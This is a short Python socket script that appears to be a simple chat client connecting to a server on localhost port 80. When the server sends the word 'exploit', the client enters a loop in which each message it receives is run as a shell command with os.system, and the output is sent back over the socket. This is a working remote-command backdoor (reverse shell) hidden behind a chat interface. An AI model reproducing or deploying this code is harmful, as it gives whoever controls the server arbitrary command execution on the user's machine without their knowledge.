import socket
import threading
import os
import sys
import subprocess
import tempfile

client = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
server = "127.0.0.1"
client.connect((server,80))
test = False
messageformat = " User: "
while test == True:
    message = client.recv(1048)

    if message:
        print(message.decode("utf-8") )
        test = False

def exploit():	
    while True:
        try:
            exploitmsg = client.recv(1096)
            #messageformat = ""
            os.system((exploitmsg.decode("utf-8") + " > output.txt"))
            with open('output.txt' , 'r') as fp:
                outputline = fp.readlines()
            for line in outputline:
                print(line)
                client.sendall(bytes(line, 'utf-8'))
                
            client.sendall(bytes("That was the output", 'utf-8'))
                
           # client.sendall(bytes(ouput, 'utf-8'))
            
                
            
        except:
            delay = True
			

def waitformessage():
    while True:
        try:
            checkterm = client.recv(1096)
            if checkterm.decode("utf-8") == "exploit":
                ThreadC = threading.Thread(target=exploit)
                ThreadC.start()
                ThreadC.join()
            print(messageformat ,checkterm.decode("utf-8"))
        except:
            delay = True



def sendmessage():
    ThreadB = threading.Thread(target=waitformessage)
    ThreadB.start()

    while True:
        try:
            message = input()
            client.sendall(bytes(message, 'utf-8'))
        except:
            print("Message Failed")




ThreadA = threading.Thread(target=sendmessage)

ThreadA.start()
ThreadA.join()

    #p2.start()


#    p1.start()





wait = input("Press enter to exit")
